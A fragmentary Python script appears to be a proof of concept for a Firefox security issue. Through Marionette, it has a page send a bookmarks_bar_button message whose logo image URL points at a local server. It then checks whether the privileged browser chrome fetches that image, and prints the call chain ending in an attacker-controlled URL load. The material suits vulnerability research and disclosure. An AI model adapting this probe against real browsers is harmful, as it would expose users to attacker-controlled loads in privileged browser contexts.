...
def main():
    ...
    try:
        ...
        # ---- bookmarks_bar_button: chrome-side image load from message content ----
        m.cmd("Marionette:SetContext", {"value": "chrome"})
        m.cmd("WebDriver:ExecuteScript", {"script": """
          // make sure the bookmarks toolbar is visible so the widget is created
          const win = Services.wm.getMostRecentWindow("navigator:browser");
          try { win.setToolbarVisibility(win.document.getElementById("PersonalToolbar"), true); } catch (e) {}
          return "ok";
        """, "args": [], "sandbox": None})
        time.sleep(2)
          ...
          try {
            window.ASRouterMessage({
              ...
              data: { content: {
                ...
                content: {
                  label: { raw: "SNOX-BMB" },
                  action: { type: "OPEN_URL", data: { args: "https://example.invalid/" } },
                  logo: { imageURL: target + "/BMB-CHROME-IMAGE-FETCH" },
                },
              } },
            });
            return "sent";
          } catch (e) { return "threw: " + String(e); }
        """, "args": [f"http://127.0.0.1:{PORT}"], "sandbox": None})
        print("page sent bookmarks_bar_button:", sent.get("value") if isinstance(sent,dict) else sent)
        time.sleep(5)

        m.cmd("Marionette:SetContext", {"value": "chrome"})
        st = m.cmd("WebDriver:ExecuteScript", {"script": """
          const win = Services.wm.getMostRecentWindow("navigator:browser");
          const n = win.document.getElementById("fxms-bmb-button");
          return JSON.stringify({
            widgetPresent: !!n,
            label: n ? n.getAttribute("label") : null,
            listStyleImage: n ? n.style.listStyleImage : null,
          });
        """, "args": [], "sandbox": None})
        print("chrome widget state:", st.get("value") if isinstance(st,dict) else st)
        ...
        if HITS:
            ...
            print("      -> ASRouter.routeCFRMessage(data.content) -> case 'bookmarks_bar_button'")
            print("      -> BookmarksBarButton.showBookmarksBarButton")
            print("      -> aNode.style.listStyleImage = url(<attacker URL>)  [chrome document load]")
